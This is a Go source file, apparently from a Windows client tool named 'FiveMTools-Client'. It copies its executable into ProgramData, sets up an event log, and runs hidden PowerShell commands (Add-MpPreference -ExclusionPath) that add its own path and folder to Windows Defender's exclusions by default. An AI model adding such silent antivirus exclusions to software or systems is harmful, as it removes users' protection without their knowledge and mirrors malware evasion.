package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	"golang.org/x/sys/windows/svc/debug"
	"golang.org/x/sys/windows/svc/eventlog"
)

func copyFile(srcPath, targetPath string) error {
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer srcFile.Close()

	dstFile, err := os.Create(targetPath)
	if err != nil {
		return fmt.Errorf("failed to create target executable in ProgramData: %w", err)
	}
	defer dstFile.Close()

	if _, err := io.Copy(dstFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable to ProgramData: %w", err)
	}

	if err := dstFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync target executable: %w", err)
	}

	return nil
}

func defenderExclude(name string) error {
	if localDebug || noDefenderExclude {
		return nil
	}

	programDataDir := os.Getenv("ProgramData")
	if programDataDir == "" {
		return fmt.Errorf("PROGRAMDATA environment variable not set")
	}

	srcPath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	targetDir := filepath.Join(programDataDir, name)
	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
		if err := os.MkdirAll(targetDir, os.ModePerm); err != nil {
			return fmt.Errorf("failed to create service directory in ProgramData: %w", err)
		}
	}

	var cmd string
	var execCmd *exec.Cmd
	args := []string{"-NoProfile", "-NonInteractive", "-Command"}

	cmd = fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, srcPath)
	execCmd = exec.Command("powershell.exe", append(args, cmd)...)
	execCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := execCmd.Run(); err != nil {
		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
	}

	cmd = fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, targetDir)
	execCmd = exec.Command("powershell.exe", append(args, cmd)...)
	execCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := execCmd.Run(); err != nil {
		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
	}

	return nil
}

var elogClient debug.Log

var elogClientName string = "FiveMTools-Client"

func InitElogClient() (func() error, error) {
	if localDebug || noElogClient {
		return func() error { return nil }, nil
	}

	var err error
	_ = eventlog.InstallAsEventCreate(elogClientName, eventlog.Error|eventlog.Warning|eventlog.Info)
	if elogClient, err = eventlog.Open(elogClientName); err != nil {
		elogClient = debug.New(elogClientName)
	}
	return elogClient.Close, err
}

func failedf(format string, a ...any) {
	if elogClient != nil {
		_ = elogClient.Error(1, fmt.Sprintf(format+"\n", a...))
	} else {
		fmt.Fprintf(os.Stderr, format+"\n", a...)
	}
}
